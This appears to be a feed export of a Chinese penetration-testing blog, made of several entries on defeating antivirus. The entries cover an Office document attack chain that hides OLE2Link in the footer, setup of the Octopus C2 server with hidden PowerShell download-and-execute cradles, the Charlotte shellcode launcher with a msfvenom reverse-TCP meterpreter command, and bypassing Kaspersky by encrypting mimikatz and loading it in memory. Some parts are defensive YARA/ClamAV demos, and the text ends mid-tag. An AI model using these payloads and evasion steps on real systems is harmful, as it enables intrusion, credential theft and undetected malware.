        <content type="html"><![CDATA[<p>动态免杀<br>插入Excel.SheetMacroEnabled对象<br>下载回来的10.doc实际上是一个RTF文档，里面内嵌了一个Excel.SheetMacroEnabled对象，Excel.SheetMacroEnabled是一个启用宏的Excel对象，相当于把一个带宏的Excel嵌入了Word文档中：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655706123038/1c1e817bec314a42844bf05b8f15f90e.png" alt="image.png"></p><p>下图分别是Excel.SheetMacroEnabled.12对象的对象名和CLSID：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655706123038/d0739b13eb1544199ac883b8ceaef6f3.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655706123038/7b01c6b8d8b44690b272149355d7b85b.png" alt="image.png"></p><p>在OleView中查看Excel.SheetMacroEnabled对象，CLSID正是{00020832-0000-0000-C000-000000000046}，并且LocalServer指向了EXCEL.EXE，这表示该对象对应的COM组件是一个单独的EXE组件，COM将通过其远程处理架构（通常涉及远程过程调用（RPC））来将这个exe加载起来，也就是说EXCEL.EXE将会和之前的Eqnedt32.exe一样，由COM直接创建而不是由WinWord.exe启动，这个特点可以有效对抗一些通过进程链来动态检测威胁的杀毒软件的查杀：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655706123038/2b541fd43a5f49ef8d0baf52717d880f.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.29-office-mian-sha-tao-jian-yuan-li-fen-xi-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.29-office-mian-sha-tao-jian-yuan-li-fen-xi-er/</url>
      
        <content type="html"><![CDATA[<h2 id="office免杀套件原理分析（二）"><a href="#office免杀套件原理分析（二）" class="headerlink" title="office免杀套件原理分析（二）"></a>office免杀套件原理分析（二）</h2><p>样本使用了多种技巧对抗杀软检测，这从攻击样本在VirusTotal上的查杀情况仅有3家可以检测即可看出，免杀技巧分析如下。</p><p>静态免杀<br>页脚中插入OLE2Link<br>样本在Office Word文档的页脚中插入OLE2Link对象以躲避杀软的检测，由于常见的基于OLE2Link的漏洞利用（比如CVE-2017-0199）都是在word\document.xml中插入远程的OLE对象，所以这导致大部分杀软并未检测到document.xml以外的组件中包含的威胁，样本在页脚中插入OLE2Link对象的分析如下：</p><p>1.页脚文件word\footer2.xml中包含了一个Link对象，id为rId2：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655695187017/b2c1f0168aa24914a5e4f1802481d501.png" alt="image.png"></p><p>2.word_rels\footer2.xml.rels中可以看到rId2的具体内容：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655695187017/87a0c5e6182e4c4db73e1023f0697c2f.png" alt="image.png"></p><p>Link对象指向了hxxp://bit.ly/loleading，而ly是一个生成短链接的网站，打开hxxp://bit.ly/loleading后将跳转至hxxp://<a href="http://www.0-day.us/img/doc/10.doc%E3%80%82%E4%BA%8E%E6%98%AF%E5%BD%93%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%93%E5%BC%80Rigging">www.0-day.us/img/doc/10.doc。于是当受害者打开Rigging</a> in Pakistan Senate.doc后，WinWord.exe会将10.doc下载并加载。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.28-tong-yong-sha-ruan-de-yun-jian-ding-he-fen-xi-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.28-tong-yong-sha-ruan-de-yun-jian-ding-he-fen-xi-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="通用杀软的云鉴定和分析（一）"><a href="#通用杀软的云鉴定和分析（一）" class="headerlink" title="通用杀软的云鉴定和分析（一）"></a>通用杀软的云鉴定和分析（一）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655340038010/9a362581ad3d4b5caac5846c1607f9ae.png" alt="image.png"></p><p>控制中心：控制中心部署在企业的内部私有服务器上，通过基于 B/S 模式<br>的管理平台，管理员可以通过浏览器进行远程管理和查看，主要功能包括：全<br>网终端资产管理，安全策略管控，全网安全状态自动分析/告警，以及云查杀引<br>擎等。<br>控制中心主要提供以下功能：</p><ol><li><p>统一管理所有终端</p></li><li><p>灵活配置和下发策略</p></li><li><p>报表可视化展现<br>客户端：客户端部署在需要被保护的终端或服务器上，并与安全控制中心<br>通信，响应控制中心设置的病毒防护，补丁修复，系统管理的策略以及任务，<br>同时每个客户端在内网都具备一个探针的能力，实时收集内网的风险信息，实<br>时上报给控制中心。<br>客户端主要提供以下功能：</p></li><li><p>执行病毒查杀，漏洞修复，进程、外设、网络管控等操作，分自主执行<br>和被动执行后台控制中心下发的策略两种方式</p></li><li><p>将客户端的安全日志和行为日志上传至后台控制中</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655340038010/dcdd07b8cf8c435bb4c16bd68e1e60ed.png" alt="image.png"></p></li></ol><h4 id="平台承载"><a href="#平台承载" class="headerlink" title="平台承载"></a>平台承载</h4><p>腾讯御点后台控制中心部署环境支持 windows server 操作系统服务器和<br>Linux 操作系统服务器，windows server 操作系统包括 Windows Server<br>2003_SP2/Windows Server 2008/Windows Server 2012，Linux 操作系统<br>包括 Linux 内核 V3.1 以上版本，支持 SuSE, Redhat, CentOS, Ubuntu 和<br>Debian 等；<br>腾讯御点客户端支持 windows server 客户端和 windows 系列操作系统<br>的客户端，windows 系列操作系统包括 Windows XP_SP3 及以上/Windows<br>Vista/Windows 7/Windows 8/Windows 10。<br> 功能模块<br>腾讯御点全面包含终端病毒查杀、漏洞修复、统一终端管理和策略管控等<br>功能，其主要功能模块简介如下：</p><ol><li>终端管理：展示全网终端的软硬件信息和安全防护状态，分组、自定<br>义或指执行统一的病毒查杀和补丁修复操作，终端统一升级管理</li><li>病毒查杀：针对常规病毒木马，采用 双云+TAV 查杀机制，内存占用<br>低、识别率高、兼容性强，支持隔离网样和宏病毒查杀；针对未知病<br>毒木马，采用 TVM 人工智能启发式引擎+主动防御云引擎相结合实时<br>拦截用户的可疑行为；</li><li>漏洞修复：支持补丁类型分类，过滤掉无效补丁；支持补丁错峰下<br>发，保障企业网络带宽资源的正常使用；提供漏洞排名、终端漏洞情<br>况统计及数据画表的导出</li><li>策略管控：提供安全策略和管控策略；安全策略包含系统基本安全设<br>置、病毒查杀、实时防护、漏洞修复等策略配置；管控策略提供进程<br>管控、外设管控、网络端口管控等策略配置；</li><li>软件管理：覆盖 1 万多款 19 大类常用软件；同时支持软件禁用、软件<br>分发等功能。</li><li>多账户管理： 可分配三种管理员权限，普通管理员、账号管理员、审<br>计管理员，适应企业不同人员权限的划分设置，以保证灵活与安全</li><li>分组管理：支持多种自动分组规则，如：IP 分组，LDAP 同步等</li><li>安全工具箱：现已集成文档保护、网络净化和垃圾清理等工具；文档<br>保护提供文档自动备份和实时监控、文档找回及文档解密 3 种功能；<br>网络净化支持软件弹窗拦截和捆绑安装拦截能力；垃圾清理除针对系<br>统、上网、聊天、软件、游戏、影音等垃圾提供一键扫描清除外，还<br>可对终端使用痕迹、、插件和文件进行指定清理。<br> 产品联动<br>腾讯御点支持与御见、御界等其他腾讯企业安全产品联动，可采集终端的<br>网络访问信息，病毒信息，漏洞信息、终端异常行为数据、DDos 信息和 DNS<br>信息等，结合腾讯威胁情报大数据，对全网终端的安全状态进行多维度的威胁<br>态势分析、溯源、呈现和处置</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.28-c2-fu-wu-qi-ling-lei-da-jian-fang-fa-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.28-c2-fu-wu-qi-ling-lei-da-jian-fang-fa-er/</url>
      
        <content type="html"><![CDATA[<h2 id="C2服务器另类搭建方法（二）"><a href="#C2服务器另类搭建方法（二）" class="headerlink" title="C2服务器另类搭建方法（二）"></a>C2服务器另类搭建方法（二）</h2><h4 id="关于Octopus"><a href="#关于Octopus" class="headerlink" title="关于Octopus"></a>关于Octopus</h4><p>Octopus是一款基于Python开发的开源工具，该工具可以通过HTTP/S控制Octopus Powershell代理。</p><p>Octopus的主要目的是帮助红队研究人员在对目标进行操作之前，先通过Octopus收集目标设备的信息，并对其执行渗透测试。</p><p>Octopus以一种非常简单的方式通过加密良好的通道执行命令并与C2交换信息，这种方式确保了几乎所有的AV、终端保护和网络监控方案都难以识别和探测到Octopus操作。</p><p>Octopus中有一个很酷的功能叫做ESA，它代表“端点态势感知”，它将收集有关目标的一些重要信息，帮助我们更好地了解在操作过程中将面对的目标网络端点，从而让我们能够根据这些信息定制实际操作方案。</p><p>Octopus的操作非常隐蔽，并且使用了AES-256作为PowerShell代理和C2服务器之间通信数据的加密算法。除此之外，我们还可以通过有效证书来配置Octopus C2服务器使用SSL/TLS。</p><h4 id="Octopus关键功能"><a href="#Octopus关键功能" class="headerlink" title="Octopus关键功能"></a>Octopus关键功能</h4><p>Octopus提供了许多功能，可以帮助红队研究人员在开始任务之前更好地了解目标的相关信息：</p><pre class="line-numbers language-none"><code class="language-none">1、通过HTTP/S控制代理；2、执行系统命令；3、下载/上传文件；4、加载外部PowerShell模块；5、C2和代理之间使用AES-256加密信道；6、使用了隐蔽的方法来执行命令和传输数据；7、支持为每个目标创建自定义的监听器；8、生成不同类型的Payload；9、生成2.0或更高版本的PowerShell，支持所有版本的Windows；10、在不需要触发powershell.exe进程的情况下执行Octopus Windows代理可执行程序；11、自动从所有端点自动收集信息；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下列命令可以安装Octopus所需的所有依赖组件：</p><pre class="line-numbers language-none"><code class="language-none">pip install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果使用的是Linux系统，则需要安装nasm、mingw-w64和mono-devel：</p><pre class="line-numbers language-none"><code class="language-none">apt install nasmapt install mingw-w64apt install mono-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h4><p>首先，我们需要使用下列命令将该项目源码克隆至本地：</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/mhaskar/Octopus/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来，使用下列命令安装Octopus所需的所有依赖组件：</p><pre class="line-numbers language-none"><code class="language-none">pip install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后，使用下列命令开启并运行Octopus服务器：</p><pre class="line-numbers language-none"><code class="language-none">./octopus.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，我们将看到如下所示的信息：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655428174053/22b7308799ba4a3e820723a7fb7601d0.png" alt="image.png"></p><h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><h5 id="HTTP监听器"><a href="#HTTP监听器" class="headerlink" title="HTTP监听器"></a>HTTP监听器</h5><p>下列命令将运行一个名为operation1的监听器：</p><pre class="line-numbers language-none"><code class="language-none">listen_http 0.0.0.0 8080 192.168.178.1 5 page.php operation1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述命令将返回如下所示的结果：</p><pre class="line-numbers language-none"><code class="language-none">Octopus &gt;&gt;listen_http 0.0.0.0 8080 192.168.178.1 5 page.php operation1Octopus &gt;&gt; * Serving Flask app "core.weblistener" (lazy loading)&nbsp;* Environment: production&nbsp;&nbsp;&nbsp;WARNING: Do not use the development server in a production environment.&nbsp;&nbsp;&nbsp;Use a production WSGI server instead.&nbsp;* Debug mode: off&nbsp;Octopus &gt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="HTTPS监听器"><a href="#HTTPS监听器" class="headerlink" title="HTTPS监听器"></a>HTTPS监听器</h4><pre class="line-numbers language-none"><code class="language-none">Octopus &gt;&gt;listen_https[-] Please check listener arguments !Syntax &nbsp;: listen_https BindIP BindPort hostname interval URL listener_name certficate_path key_pathExample (with domain) : listen_https 0.0.0.0 443 myc2.live 5 login.php op1_listener certs/cert.pem certs/key.pemOctopus &gt;&gt;listen_https 0.0.0.0 443 myc2.live 5 login.php darkside_operation certs/cert.pem certs/key.pemSSL listener started ![+]darkside_operation Listener has been createdOctopus &gt;&gt; * Serving Flask app "core.weblistener" (lazy loading)&nbsp;* Environment: production&nbsp;&nbsp;&nbsp;WARNING: Do not use the development server in a production environment.&nbsp;&nbsp;&nbsp;Use a production WSGI server instead.&nbsp;* Debug mode: off&nbsp;Octopus &gt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="PowerShell代理生成"><a href="#PowerShell代理生成" class="headerlink" title="PowerShell代理生成"></a>PowerShell代理生成</h4><p>下列命令将针对operation1监听器生成一个代理：</p><pre class="line-numbers language-none"><code class="language-none">generate_powershell operation1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，我们将看到如下所示的结果：</p><pre class="line-numbers language-none"><code class="language-none">Octopus &gt;&gt;generate_powershell operation1#====================1) powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"&nbsp;2) powershell -w hidden "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"&nbsp;3) powershell -w hidden "$w = (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');Invoke-Expression $w;"&nbsp;Note - For Windows 7 clients you may need to prefix the payload with "Add-Type -AssemblyName System.Core;"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.g. powershell -w hidden "Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"&nbsp;Hack your way in ;)#====================&nbsp;Octopus &gt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="许可证协议"><a href="#许可证协议" class="headerlink" title="许可证协议"></a>许可证协议</h2><p>本项目的开发与发布遵循<a href="https://github.com/mhaskar/Octopus/blob/master/LICENSE">GPL-3.0</a>开源许可证协议。</p><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><strong>Octopus：</strong> 【<a href="https://github.com/mhaskar/Octopus">GitHub传送门</a>】</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://github.com/mhaskar/Octopus/issues">https://github.com/mhaskar/Octopus/issues</a></p><p><a href="https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/">https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/</a></p><p><a href="https://shells.systems/octopus-v1-0-stable-cobalt-strike-deployment-much-more">https://shells.systems/octopus-v1-0-stable-cobalt-strike-deployment-much-more</a></p><p><a href="https://shells.systems/unveiling-octopus-the-pre-operation-c2-for-red-teamers/">https://shells.systems/unveiling-octopus-the-pre-operation-c2-for-red-teamers/</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.27-qia-ba-si-ji-yin-qing-shi-zu-clamav-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.27-qia-ba-si-ji-yin-qing-shi-zu-clamav-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="卡巴斯基引擎始祖Clamav"><a href="#卡巴斯基引擎始祖Clamav" class="headerlink" title="卡巴斯基引擎始祖Clamav"></a>卡巴斯基引擎始祖Clamav</h2><p>前言<br>这篇文章我们将介绍一款开源杀毒软件Clamav，他也是卡巴斯机引擎的鼻祖，目前最新2022版卡巴斯基依然使用Clamav引擎框架，是通过学习开源杀毒软件病毒查杀原理来绕过其查杀技术。</p><p>环境配置<br>1.下载Clamav,建议下载portable版本。<br>2.运行下列命令配置Clamav。</p><p>cd “解压的目录\clamav”<br>copy .\conf_examples\freshclam.conf.sample .\freshclam.conf<br>copy .\conf_examples\clamd.conf.sample .\clamd.conf<br>write.exe .\freshclam.conf，删除Example一行<br>write.exe .\clamd.conf，删除Example一行</p><p>开始实战<br>该实战通过两个示例，查杀已知病毒和查杀未知病毒，让读者了解病毒查杀的基本原理。</p><p>查杀已知病毒</p><p>制作病毒<br>写一个包含了下列文本的txt。保存为file1.txt文件。我们将其作为病毒文件。它有明显的特征，hideDir(“c:\”)函数。正常程序不会把C盘隐藏。<br>this is virus;<br>hideDir(“c:”);<br>写一个包含了下列文本的txt。保存为file2.txt文件。</p><p>abcdthis is virusefg。<br>写一个包含了下列文本的txt。保存为file3.txt文件。</p><p>12345this is virus6789。<br>将上述三个文件放置在同一个目录。</p><p>编写Yara规则<br>首先通过分析病毒文件，发现病毒文件包含了hideDir(“c:\”)，编写一个简单的规则，其含义为只要包含了hideDir(“c:\”)函数的的则是病毒。然后将其保存为文件。</p><pre class="line-numbers language-none"><code class="language-none">rule virus{    strings:        $flag = "hideDir(\"c:\\\")"    condition:        $flag}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行查杀<br>执行以下命令<br>clamscan -d 规则目录 病毒存放目录<br>其中-d标志表示使用自定义规则<br>执行结果如下图所示</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655170571015/5dc25d87548b4f67a07dbac7aa9e1369.png" alt="image.png"></p><p>其中file1.txt包含了特征，被表示为YARA.virus.UNOFFICIAL FOUND，说明发现病毒。而其余两个文件没包含，则显示OK，表示没有包含病毒。</p><p>查杀未知病毒 制作病毒<br>写一个包含了下列文本的txt。保存为file1.txt文件。原始病毒文件。<br>this is virus;<br>hideDir(“c:”);<br>写一个包含了下列文本的txt。保存为file2.txt文件。该文件是file1的变种，由于作者发现被查杀后。更换了hideDir函数为hideDirEx。</p><p>this is virus version 2;<br>hideDirEx(“c:”);<br>写一个包含了下列文本的txt。保存为file3.txt文件。该文件是file2的变种，由于作者发现被查杀后。又更改了隐藏盘符的实现方式！</p><p>this is virus version 3;<br>changDirAttribute(“c”,“display=no”);<br>将上述文件放置在同一个目录。</p><p>编写Yara规则<br>通过分析上述例子，我们发现，对于单一的特征码形式的查杀，我们都是属于发现病毒，编写规则。那么我们也可以很明显发现特征，这三个病毒都会调用和目录相关的函数，并且都设置为隐藏。那么我们就可以提取出特征，既隐藏盘符的特征码。我们通过查阅计算机接口文档，发现还有一函数hideAllDir()。那么我们提前将其纳入到规则中。</p><pre class="line-numbers language-none"><code class="language-none">rule virus{    strings:        $flag = "hideDir"        $flag2 = "hideDirEx"        $flag3 = "changDirAttribute"        $flag4 = "hideAllDir"    condition:        $flag or $flag2 or $flag3 or $flag4}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.27-qia-ba-si-ji-yin-qing-ling-lei-mian-sha-wan-fa-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.27-qia-ba-si-ji-yin-qing-ling-lei-mian-sha-wan-fa-san/</url>
      
        <content type="html"><![CDATA[<h2 id="卡巴斯基引擎另类免杀玩法"><a href="#卡巴斯基引擎另类免杀玩法" class="headerlink" title="卡巴斯基引擎另类免杀玩法"></a>卡巴斯基引擎另类免杀玩法</h2><p>Charlotte是一款基于C++实现的Shellcode启动器，并且完全不会被安全解决方案所检测到。</p><h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址:"></a>项目地址:</h4><p><a href="https://github.com/9emin1/charlotte">https://github.com/9emin1/charlotte</a></p><h4 id="Charlotte特色"><a href="#Charlotte特色" class="headerlink" title="Charlotte特色"></a>Charlotte特色</h4><ol><li>c++ shellcode 启动器，截至 2021 年 5 月 13 日完全未被检测到 0/26。</li><li>win32 api函数的动态调用</li><li>shellcode和函数名的异或加密</li><li>每次运行随机 XOR 键和变量</li><li>在 Kali Linux 上，只需“apt-get install mingw-w64*”即可！</li><li>随机字符串长度和 XOR 密钥长度</li></ol><h2 id="杀毒软件检测截图"><a href="#杀毒软件检测截图" class="headerlink" title="杀毒软件检测截图"></a>杀毒软件检测截图</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655171735008/d8c50937628944de909610483807b209.png" alt="image.png"></p><p>用法</p><p>git clone 存储库，生成命名为 beacon.bin 的 shellcode 文件，然后运行 charlotte.py</p><p>git clone <a href="https://github.com/9emin1/charlotte.git">https://github.com/9emin1/charlotte.git</a> &amp;&amp; apt-get install mingw-w64*</p><p>cd charlotte</p><p>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw &gt; beacon.bin</p><p>python charlotte.py</p><p>profit</p><p>使用 msfvenom -p（显示在下面的 gif POC 中）以及cobalt strike攻击原始格式有效负载进行测试</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="启动命令"><a href="#启动命令" class="headerlink" title="启动命令"></a>启动命令</h3><p>python charlotte.py</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655171735008/69eb3b004e36442280e4314c418140e4.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.27-qia-ba-si-ji-yin-qing-mian-sha-yuan-li-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.27-qia-ba-si-ji-yin-qing-mian-sha-yuan-li-er/</url>
      
        <content type="html"><![CDATA[<h2 id="卡巴斯基引擎免杀环境搭建"><a href="#卡巴斯基引擎免杀环境搭建" class="headerlink" title="卡巴斯基引擎免杀环境搭建"></a>卡巴斯基引擎免杀环境搭建</h2><p>伪造未知变种</p><p>那么上述我们通过已获取到的样本，编写好了规则，并且将一个还未发现的病毒file4类型也纳入了规则中。那么我们现在尝试是否会监测到新添加进去的样本。结果如下图。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655171208084/667ae4e5edca47abbacb5986f2ab4dd3.png" alt="image.png"></p><p>可以看到，在我们建立好启发规则后，新病毒也被监测到了。</p><p>总结<br>特征码和启发式查杀在免杀制作过程中，需要非常注意的是启发式查杀，因为启发式查杀对壳一类的查杀非常厉害。或者数组中包含PE文件，也会直接被定为为病毒。这就导致了你需要尽量模仿正常PE文件才能绕过查杀。具体会在静态查杀绕过一章介绍方法。</p><p>绕过<br>通过前面章节的静态查杀原理学习，我们知道要绕过静态查杀需要绕过两种查杀方式，一种为指定特征码查杀，一种为启发式查杀。</p><p>环境配置<br>1.虚拟机安装Kaspersky Endpoint Security 11</p><p>开始实战<br>特征码查杀绕过<br>制作病毒</p><p>接下来我们使用Mimikatz作为测试工具，从Mimikatz Release下载处下载Mimikatz，将Mimikatz.exe放入kas中。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655171208084/3b5c4ae846c542389c7502715c385a8a.png" alt="image.png"></p><p>如上述所示，会被Kas查杀。</p><p>绕过方式<br>那么接下来我们则使用Github上开源的加密工具来加密。从该地址文件加密工具下载，使用FileCryptAES.exe -e 1234 mimikatz.exe加密后。得到一个加密文件，我们将其放到KAS进行扫描，发现成功绕过。之后使用内存加载，解密执行即可。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655171208084/b3efbf0f743b485a9755886940b60d1b.png" alt="image.png"></p><p>特征码查杀绕过总结</p><p>对文件反复加密，加密方式可以自选，之后内存解密加载即可。</p><p>内存加载方式可以使用下列几个项目：</p><p>1.<a href="https://github.com/aaaddress1/RunPE-In-Memory">https://github.com/aaaddress1/RunPE-In-Memory</a><br>2.<a href="https://github.com/nettitude/SimplePELoader">https://github.com/nettitude/SimplePELoader</a><br>3.<a href="https://github.com/BenjaminSoelberg/ReflectivePELoader">https://github.com/BenjaminSoelberg/ReflectivePELoader</a><br>4.<a href="https://github.com/hasherezade/pe_to_shellcode">https://github.com/hasherezade/pe_to_shellcode</a><br>4.<a href="https://github.com/hasherezade/pe_to_shellcode">https://github.com/hasherezade/pe_to_shellcode</a><br>5.<a href="https://github.com/fancycode/MemoryModule">https://github.com/fancycode/MemoryModule</a><br>6.<a href="https://github.com/Scavanger/MemoryModule.net">https://github.com/Scavanger/MemoryModule.net</a></p><p>注意：<br>1.这里仅仅是绕过了静态特征码查杀，内存加载后会被动态查杀，具体绕过方式将会在动态一章介绍。<br>2.对于Xor或base64等加密后特征一致的算法需要多次加密。<br>启发式查杀绕过<br>制作病毒</p><p>下面我们来制作一个最小体积程序。使用Visualstudio创建Win32程序。删除所有资源和窗口。仅仅留下一句MessageBox。看看是否会被查杀。</p><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"#include "KasHeuristicBypass.h"int APIENTRY _tWinMain(HINSTANCE hInstance,                     HINSTANCE hPrevInstance,                     LPTSTR    lpCmdLine,                     int       nCmdShow){    MessageBox(NULL, TEXT("title"), TEXT("123"), MB_OK);    return (int) 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绕过方式<br>还记得我们之前删除的资源和其他的窗体文件吗？将其还原即可，既给我们的病毒程序增加窗体和资源文件。既像正常程序该有的我们都有，就很难被启发式查杀了。</p><p>启发式绕过总结<br>模仿正常PE特征。</p><p>总结<br>无论是特征码还是启发式，只要不是加载器都可以使用反复加密，内存加载执行来绕过静态查杀。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.26-wan-zheng-de-360-quan-jia-tong-mian-sha-ji-qiao/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.26-wan-zheng-de-360-quan-jia-tong-mian-sha-ji-qiao/</url>
      
        <content type="html"><![CDATA[<h2 id="360核晶引擎防护的原理（一）"><a href="#360核晶引擎防护的原理（一）" class="headerlink" title="360核晶引擎防护的原理（一）"></a>360核晶引擎防护的原理（一）</h2><p>一、什么是核晶引擎?<br>核晶引擎是利用Intel / AMD CPU硬件虚拟化技术(Vanderpool Technology，简称VT技术)做的客户端防护引擎. 目前仅用于主防功能. 后续还可用于其他客户端安全功能.</p><p>二、作用</p><p>核晶引擎目前用于增强”Win7 / 8 / 8.1” 64位系搜索统上的主动防御功能.</p><p>1、开启硬件虚拟化防护引擎的要求是什么？<br>1）CPU需要支持硬件虚拟化机制：即 Intel-VT 和 AMD-V 机制，并且在Bios或UEFI中打开了硬件虚拟化支持；<br>Intel用户可参考此链接： <a href="http://ark.intel.com/zh-cn/products/virtualizationtechnology">http://ark.intel.com/zh-cn/products/virtualizationtechnology</a> 查看自己的CPU是否支持；<br>AMD用户除“闪龙-Sampron处理器”外，其他AMD CPU均支持AMD-V；    打开硬件虚拟化支持请参考此链接： <a href="http://bbs.360safe.com/thread-2181954-1-1.html">http://bbs.360safe.com/thread-2181954-1-1.html</a><br>2）操作其他必须是”Win7 Win8 Win8.1”64位系统。<br>以上两个条件必须同时满足。</p><p>Intel VT-d的全称是Intel Virtualization Technology for Direct I/O，它是Intel虚拟化技术的一部分，主要针对的是I/O子系统，它的实现主要是通过在硬件上引入重定向单元，该硬件重定向单元用于对I/O子系统的DMA操作和中断传递进行重定向，从而辅助VMM（Virtual Machine Monitor）实现I/O子系统的虚拟化。</p><pre class="line-numbers language-none"><code 